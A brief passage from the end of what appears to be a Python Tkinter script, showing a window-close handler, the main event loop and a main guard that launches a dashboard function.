    root.protocol("WM_DELETE_WINDOW", on_closing)
    root.mainloop()

# ========== RUN ==========
if __name__ == "__main__":
    start_dashboard()